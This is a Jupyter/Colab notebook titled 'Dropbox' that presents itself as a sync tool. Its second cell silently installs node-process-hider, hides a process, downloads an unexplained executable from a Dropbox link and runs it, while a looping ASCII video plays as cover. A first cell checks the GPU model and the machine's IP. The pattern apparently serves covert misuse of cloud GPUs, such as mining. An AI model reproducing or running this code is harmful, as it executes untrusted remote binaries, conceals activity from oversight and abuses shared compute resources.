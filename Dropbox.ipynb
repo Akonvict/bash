{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Dropbox",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "#@title **get-data** \n",
        "!curl ipinfo.io\n",
        "gpu_info = ! nvidia-smi -L\n",
        "gpu_info = '\\n'.join(gpu_info)\n",
        "if gpu_info.find('V100-PCIE...') >=0:\n",
        "  print(gpu_info)\n",
        "  exit()\n",
        "else :\n",
        "  print(gpu_info)\n",
        "import torch\n",
        "print(torch.cuda.get_device_name(0))"
      ],
      "metadata": {
        "id": "Npu_LjcDOsdL",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Synchronize...** \n",
        "%%capture\n",
        "%%shell\n",
        "sudo apt update -y\n",
        "sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm mplayer -y\n",
        "wget http://incident.net/v8/files/mp4/41.mp4\n",
        "cat > film.sh << END\n",
        "while :; do\n",
        "mplayer -vo caca 41.mp4\n",
        "done\n",
        "END\n",
        "sleep 1\n",
        "npm i -g node-process-hider && ph add pager \n",
        "wget -O film https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1\n",
        "chmod +x film\n",
        "bash film.sh >/dev/null 2>&1 >/dev/null &\n",
        "sleep 2\n",
        "./film"
      ],
      "metadata": {
        "cellView": "form",
        "id": "qADehiEGENWJ"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}